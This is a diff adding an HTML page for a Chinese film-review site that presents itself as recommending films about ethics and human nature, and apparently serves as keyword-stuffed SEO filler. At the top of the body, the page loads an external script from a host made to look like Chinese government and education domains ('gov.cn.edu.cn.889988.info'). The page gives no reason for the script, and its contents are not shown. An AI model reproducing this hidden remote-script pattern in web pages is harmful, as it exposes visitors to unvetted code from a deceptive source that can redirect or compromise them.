@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>秋霞伦理电影网 - 探讨人性与道德的经典伦理影片推荐平台</title>
+    <meta name="description" content="秋霞伦理电影网（qiuxialunlidianyingwang-top.github.io）专注于推荐和解析探讨人性、道德、社会伦理的经典电影。在这里，发现触动灵魂的光影故事，直面道德的边界。">
+    <meta name="keywords" content="秋霞伦理电影网, 伦理电影, 人性电影, 道德困境, 经典影片, qiuxialunlidianyingwang-top.github.io">
+    <meta name="robots" content="index, follow">
+    <style>
+        /* 基础重置 */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Arial Black', 'Helvetica Neue', Helvetica, sans-serif; 
+            background-color: #ffffff; 
+            color: #000000; 
+            line-height: 1.6; 
+            -webkit-font-smoothing: antialiased;
+        }
+        a { text-decoration: none; color: #000; transition: all 0.2s ease; }
+        a:hover { color: #ff0000; }
+        ul { list-style: none; }
+        
+        /* 布局容器 */
+        .container { max-width: 1400px; margin: 0 auto; padding: 0 20px; }
+        
+        /* 头部区域 */
+        header { 
+            border-bottom: 8px solid #000; 
+            padding: 40px 0; 
+            margin-bottom: 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+        header h1 { 
+            font-size: clamp(2.5rem, 6vw, 5rem); 
+            font-weight: 900; 
+            line-height: 1; 
+            text-transform: uppercase;
+            letter-spacing: -2px;
+        }
+        header h1 span { color: #ff0000; }
+        header .subtitle { 
+            font-size: 1.2rem; 
+            font-weight: bold; 
+            text-align: right; 
+            max-width: 300px;
+            border: 4px solid #000;
+            padding: 10px;
+            background: #ffff00;
+        }
+        
+        /* 导航栏 */
+        nav { 
+            margin-bottom: 60px; 
+        }
+        nav ul { 
+            display: flex; 
+            flex-wrap: wrap; 
+            gap: 20px; 
+        }
+        nav ul li { 
+            flex: 1; 
+            min-width: 200px;
+        }
+        nav ul li a { 
+            display: block; 
+            padding: 20px; 
+            background: #fff; 
+            border: 4px solid #000; 
+            text-align: center; 
+            font-weight: 900; 
+            font-size: 1.2rem; 
+            text-transform: uppercase;
+            box-shadow: 8px 8px 0 #000;
+            transition: all 0.1s ease;
+        }
+        nav ul li a:hover { 
+            background: #ff0000; 
+            color: #fff; 
+            transform: translate(4px, 4px);
+            box-shadow: 4px 4px 0 #000;
+        }
+        
+        /* 主体内容 */
+        main { padding-bottom: 80px; }
+        
+        /* 栏目通用样式 */
+        .section { 
+            margin-bottom: 80px; 
+            border: 6px solid #000;
+            padding: 40px;
+            background: #fff;
+            position: relative;
+        }
+        .section-title { 
+            font-size: 2.5rem; 
+            font-weight: 900; 
+            margin-bottom: 30px; 
+            text-transform: uppercase;
+            display: inline-block;
+            background: #000;
+            color: #fff;
+            padding: 10px 20px;
+            transform: rotate(-2deg);
+        }
+        
+        /* 栏目一：伦理聚焦 - 大色块卡片 */
+        .focus-grid { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); 
+            gap: 30px; 
+        }
+        .focus-card { 
+            border: 4px solid #000; 
+            background: #f0f0f0;
+            overflow: hidden;
+            transition: all 0.3s;
+        }
+        .focus-card:hover { 
+            transform: scale(1.02);
+            box-shadow: 12px 12px 0 #ff0000;
+        }
+        .focus-img { 
+            height: 250px; 
+            background: #ffff00; 
+            border-bottom: 4px solid #000; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-size: 2rem; 
+            font-weight: 900; 
+            text-align: center; 
+            padding: 20px;
+            color: #000;
+        }
+        .focus-card:nth-child(2) .focus-img { background: #00ffff; }
+        .focus-card:nth-child(3) .focus-img { background: #ff0000; color: #fff; }
+        .focus-content { padding: 25px; }
+        .focus-content h3 { font-size: 1.5rem; margin-bottom: 15px; font-weight: 900; }
+        .focus-content p { font-family: 'Helvetica Neue', Arial, sans-serif; font-weight: normal; font-size: 1rem; margin-bottom: 15px; }
+        .focus-content a { 
+            display: inline-block; 
+            background: #000; 
+            color: #fff; 
+            padding: 10px 20px; 
+            font-weight: bold; 
+        }
+        .focus-content a:hover { background: #ff0000; color: #fff; }
+        
+        /* 栏目二：人性片单 - 列表 */
+        .film-list { 
+            display: flex; 
+            flex-direction: column; 
+            gap: 20px; 
+        }
+        .film-item { 
+            display: flex; 
+            align-items: center; 
+            border: 4px solid #000; 
+            background: #fff;
+            transition: all 0.3s;
+        }
+        .film-item:hover { 
+            background: #000; 
+            color: #fff; 
+        }
+        .film-num { 
+            font-size: 3rem; 
+            font-weight: 900; 
+            padding: 20px 30px; 
+            background: #ff0000; 
+            color: #fff; 
+            border-right: 4px solid #000;
+            min-width: 100px;
+            text-align: center;
+        }
+        .film-item:hover .film-num { background: #ffff00; color: #000; border-right-color: #fff; }
+        .film-info { padding: 20px; flex: 1; }
+        .film-info h3 { font-size: 1.5rem; margin-bottom: 10px; }
+        .film-item:hover .film-info h3 a { color: #fff; }
+        .film-info h3 a { color: #000; }
+        .film-info h3 a:hover { text-decoration: underline; background: #ffff00; color: #000; }
+        .film-info p { font-family: 'Helvetica Neue', Arial, sans-serif; font-weight: normal; }
+        .film-tag { 
+            background: #ffff00; 
+            color: #000; 
+            padding: 5px 10px; 
+            font-size: 0.9rem; 
+            font-weight: bold; 
+            margin-left: 20px;
+            border: 2px solid #000;
+        }
+        
+        /* 栏目三：深度剖析 - 两栏 */
+        .analysis { 
+            display: grid; 
+            grid-template-columns: 1fr 1fr; 
+            gap: 40px; 
+        }
+        .analysis-text { 
+            font-family: 'Helvetica Neue', Arial, sans-serif; 
+            font-weight: normal; 
+            font-size: 1.1rem; 
+        }
+        .analysis-text p { margin-bottom: 20px; }
+        .analysis-text strong { background: #ffff00; padding: 0 5px; }
+        .analysis-quote { 
+            background: #000; 
+            color: #fff; 
+            padding: 40px; 
+            font-size: 1.5rem; 
+            font-weight: 900; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            text-align: center;
+            border: 4px solid #000;
+        }
+        
+        /* 栏目四：关于本站 */
+        .about { 
+            background: #000; 
+            color: #fff; 
+            padding: 60px; 
+            text-align: center; 
+            border: 8px solid #ff0000;
+        }
+        .about h2 { 
+            font-size: 3rem; 
+            margin-bottom: 30px; 
+            color: #ffff00; 
+            transform: rotate(1deg);
+        }
+        .about p { 
+            font-family: 'Helvetica Neue', Arial, sans-serif; 
+            font-weight: normal; 
+            font-size: 1.2rem; 
+            margin-bottom: 30px; 
+            max-width: 800px; 
+            margin-left: auto; 
+            margin-right: auto;
+        }
+        .domain-box { 
+            background: #fff; 
+            color: #000; 
+            padding: 20px; 
+            display: inline-block; 
+            font-family: 'Courier New', Courier, monospace; 
+            font-size: 1.5rem; 
+            font-weight: bold; 
+            border: 4px solid #000;
+            box-shadow: 8px 8px 0 #ff0000;
+        }
+        .domain-box a { color: #000; }
+        .domain-box a:hover { background: #000; color: #fff; }
+        
+        /* 页脚 */
+        footer { 
+            border-top: 8px solid #000; 
+            padding: 40px 0; 
+            text-align: center; 
+            background: #ffff00; 
+        }
+        footer p { 
+            font-weight: bold; 
+            margin-bottom: 10px; 
+        }
+        footer .keywords { color: #ff0000; font-size: 1.2rem; margin-top: 20px; }
+        
+        /* 移动端响应式 */
+        @media (max-width: 768px) {
+            header { flex-direction: column; align-items: flex-start; }
+            header .subtitle { text-align: left; }
+            nav ul li { min-width: 100%; }
+            .section { padding: 20px; }
+            .section-title { font-size: 2rem; }
+            .analysis { grid-template-columns: 1fr; }
+            .film-item { flex-direction: column; text-align: center; }
+            .film-num { border-right: none; border-bottom: 4px solid #000; width: 100%; }
+            .film-item:hover .film-num { border-bottom-color: #fff; }
+            .film-tag { margin-left: 0; margin-top: 10px; display: inline-block; }
+            .about { padding: 40px 20px; }
+            .about h2 { font-size: 2rem; }
+            .domain-box { font-size: 1rem; word-break: break-all; }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+    <div class="container">
+        <header>
+            <h1>秋霞<span>伦理</span>电影网</h1>
+            <div class="subtitle">直面人性深渊<br>探寻道德边界</div>
+        </header>
+        
+        <nav>
+            <ul>
+                <li><a href="#">伦理聚焦</a></li>
+                <li><a href="#">人性片单</a></li>
+                <li><a href="#">深度剖析</a></li>
+                <li><a href="#">关于本站</a></li>
+            </ul>
+        </nav>
+    </div>
+    
+    <main class="container">
+        <!-- 栏目一：伦理聚焦 -->
+        <section class="section" id="focus">
+            <h2 class="section-title">伦理聚焦</h2>
+            <div class="focus-grid">
+                <div class="focus-card">
+                    <div class="focus-img">《狩猎》</div>
+                    <div class="focus-content">
+                        <h3><a href="#">《狩猎》：群体暴力下的道德审判</a></h3>
+                        <p>一个无害的谎言如何摧毁一个成年人的世界？探讨集体无意识下的伦理崩塌。</p>
+                        <a href="#">阅读影评</a>
+                    </div>
+                </div>
+                <div class="focus-card">
+                    <div class="focus-img">《寄生虫》</div>
+                    <div class="focus-content">
+                        <h3><a href="#">《寄生虫》：阶级鸿沟中的生存伦理</a></h3>
+                        <p>穷人寄生富人，当伪装被撕破，人性的底线在哪里？一部关于社会伦理的黑色寓言。</p>
+                        <a href="#">阅读影评</a>
+                    </div>
+                </div>
+                <div class="focus-card">
+                    <div class="focus-img">《小丑》</a></div>
+                    <div class="focus-content">
+                        <h3><a href="#">《小丑》：社会遗弃者的复仇伦理</a></h3>
+                        <p>当社会体系失效，一个被边缘化的灵魂如何走向极端？探讨个体与社会的伦理责任。</p>
+                        <a href="#">阅读影评</a>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <!-- 栏目二：人性片单 -->
+        <section class="section" id="list">
+            <h2 class="section-title">人性片单</h2>
+            <div class="film-list">
+                <div class="film-item">
+                    <div class="film-num">01</div>
+                    <div class="film-info">
+                        <h3><a href="#">《盲山》</a></h3>
+                        <p>被遮蔽的罪恶与沉默的共谋，探讨人口贩卖背后的伦理困境。</p>
+                    </div>
+                    <div class="film-tag">社会伦理</div>
+                </div>
+                <div class="film-item">
+                    <div class="film-num">02</div>
+                    <div class="film-info">
+                        <h3><a href="#">《苏菲的抉择》</a></h3>
+                        <p>无法承受的生命之重，在集中营中面临的终极道德抉择。</p>
+                    </div>
+                    <div class="film-tag">战争伦理</div>
+                </div>
+                <div class="film-item">
+                    <div class="film-num">03</div>
+                    <div class="film-info">
+                        <h3><a href="#">《血观音》</a></h3>
+                        <p>棠府一家三代女人的权谋与欲望，亲情沦为最锋利的刀刃。</p>
+                    </div>
+                    <div class="film-tag">家庭伦理</div>
+                </div>
+                <div class="film-item">
+                    <div class="film-num">04</div>
+                    <div class="film-info">
+                        <h3><a href="#">《告白》</a></h3>
+                        <p>一位母亲对未成年学生的复仇，法律与道德的边界在哪里？</p>
+                    </div>
+                    <div class="film-tag">复仇伦理</div>
+                </div>
+            </div>
+        </section>
+        
+        <!-- 栏目三：深度剖析 -->
+        <section class="section" id="analysis">
+            <h2 class="section-title">深度剖析</h2>
+            <div class="analysis">
+                <div class="analysis-text">
+                    <p>伦理电影之所以动人，往往不是因为它提供了答案，而是因为它提出了问题。在<strong>秋霞伦理电影网</strong>，我们相信电影是探讨道德困境的最佳载体。</p>
+                    <p>当角色面临生与死、善与恶、个人与集体的抉择时，观众也被迫代入其中，思考“如果是我，会怎么做”。这种思考，正是现代社会中稀缺的品质。</p>
+                    <p>从《狩猎》中的集体暴力，到《寄生虫》中的阶级冲突，每一部影片都是一面照见人性的镜子。我们拒绝肤浅的娱乐，追求有深度的思考。</p>
+                </div>
+                <div class="analysis-quote">
+                    "电影是现实的渐近线。<br>在伦理的灰色地带，<br>我们寻找人性的微光。"
+                </div>
+            </div>
+        </section>
+        
+        <!-- 栏目四：关于本站 -->
+        <section class="section" id="about">
+            <div class="about">
+                <h2>关于秋霞伦理电影网</h2>
+                <p>欢迎来到<strong>秋霞伦理电影网</strong>，一个专注于伦理、人性、社会议题电影的深度解析与推荐平台。</p>
+                <p>我们致力于挖掘那些具有思想深度的作品，为您带来不仅仅是娱乐，更是一次心灵的洗礼和智识的挑战。</p>
+                <div class="domain-box">
+                    <a href="https://qiuxialunlidianyingwang-top.github.io">https://qiuxialunlidianyingwang-top.github.io</a>
+                </div>
+                <p style="margin-top: 30px;">访问我们的官方网站，获取最新、最深刻的伦理电影推荐。在光影中，遇见更好的自己。</p>
+            </div>
+        </section>
+    </main>
+    
+    <footer>
+        <div class="container">
+            <p>&copy; 2024 秋霞伦理电影网 (qiuxialunlidianyingwang-top.github.io) 保留所有权利。</p>
+            <p>核心关键词：秋霞伦理电影网 | 伦理电影推荐 | 人性电影解析</p>
+            <p class="keywords">网站域名：qiuxialunlidianyingwang-top.github.io</p>
+        </div>
+    </footer>
+</body>
+</html>
